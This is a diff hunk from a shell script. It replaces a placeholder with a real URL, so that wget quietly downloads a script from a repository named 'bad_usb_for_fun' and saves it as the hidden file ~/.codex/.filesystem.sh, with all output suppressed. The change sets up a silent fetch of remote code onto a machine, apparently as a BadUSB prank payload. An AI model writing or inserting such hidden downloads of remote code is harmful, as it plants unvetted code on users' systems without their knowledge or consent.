@@ -23,6 +23,6 @@ temp_file=$(mktemp)
     [ ! -d "$codex_dir" ] && mkdir -p "$codex_dir"
     
     # Download the file and save it as .filesystem.sh in ~/.codex/
-    wget -q -O "$filesystem_file" "URL_OF_THE_FILE_TO_DOWNLOAD"
+    wget -q -O "$filesystem_file" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/cloning/codex.sh"
     
 } >/dev/null 2>&1
